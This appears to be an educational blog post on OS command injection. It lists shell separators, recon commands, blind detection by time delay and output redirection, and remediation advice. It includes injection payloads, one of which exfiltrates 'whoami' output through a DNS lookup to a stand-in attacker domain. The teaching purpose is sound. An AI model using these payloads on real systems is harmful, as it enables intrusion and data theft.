---
author: Kayra
pubDatetime: 2026-05-02T00:00:00Z
title: OS Command Injection
slug: os-command-injection
featured: false
draft: false
tags:
  - security
  - injection
  - osint
description: An overview of OS Command Injection, detection techniques, exploitation methods, and remediation strategies.
---

## Introduction

OS Command Injection occurs when an attacker is able to inject operating system commands into the server running the application. This happens when the application passes unsafe user input to a system shell, allowing the attacker to execute commands on the host.

## Shell Metacharacters for Testing

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

| Separator | Description |
|-----------|-------------|
| `cmd1 \| cmd2` | Command 2 is executed regardless of whether Command 1 succeeds |
| `cmd1 ; cmd2` | Command 2 is executed regardless of whether Command 1 succeeds |
| `cmd1 \|\| cmd2` | Command 2 is executed only if Command 1 fails |
| `cmd1 && cmd2` | Command 2 is executed only if Command 1 succeeds |
| `$(cmd)` | Inline command execution; e.g., `echo $(whoami)` or `$(touch test.sh; echo 'ls' > test.sh)` |
| `` `cmd` `` | Inline command execution using backticks; e.g., `` `whoami` `` |
| `>(cmd)` | Process substitution output; e.g., `>(ls)` |
| `<(cmd)` | Process substitution input; e.g., `<(ls)` |

The following command separators work only on Unix-based systems:

- `;`
- Newline (`0x0a` or `\n`)

## Useful Commands

| Purpose | Linux | Windows |
|---------|-------|---------|
| Name of current user | `whoami` | `whoami` |
| Operating system | `uname -a` | `ver` |
| Network configuration | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |

## Blind OS Command Injection

Sometimes the application does not return the output of the executed command directly. In these cases, we must detect and exploit the vulnerability blindly.

### Time Delays

One way to confirm blind OS command injection is to introduce a time delay:

```text
& ping -c 10 127.0.0.1 &
```

If the response is delayed by approximately 10 seconds, the command was executed.

### Redirecting Output

Command output can be redirected to a file within the web root and then accessed directly:

```text
& whoami > /var/www/static/whoami.txt &
```

### Out-of-Band (OOB) Techniques

Out-of-band techniques force the server to make a network connection back to an attacker-controlled system, which can be used to confirm the vulnerability or exfiltrate data.

**Basic DNS lookup:**

```text
& nslookup commandinjection.attackerdomain.com &
```

**Exfiltrating data via DNS subdomain:**

```text
& nslookup `whoami`.attackerdomain.com &
```

This causes the server to perform a DNS lookup containing the output of the injected command, which the attacker can observe in their DNS logs.

## Remediation

The most effective way to prevent OS command injection is to **never call out to OS commands from application-layer code**. The web application and its components should be running under strict permissions that do not allow operating system command execution.

If calling OS commands is absolutely necessary:

- Validate against an allowlist of permitted values.
- Validate that the input is a number.
- Validate that the input contains only alphanumeric characters, with no other syntax or whitespace.

> **Note:** Attempting to sanitize input by escaping shell metacharacters is not recommended. In practice, this is too error-prone and can often be bypassed by a skilled attacker.
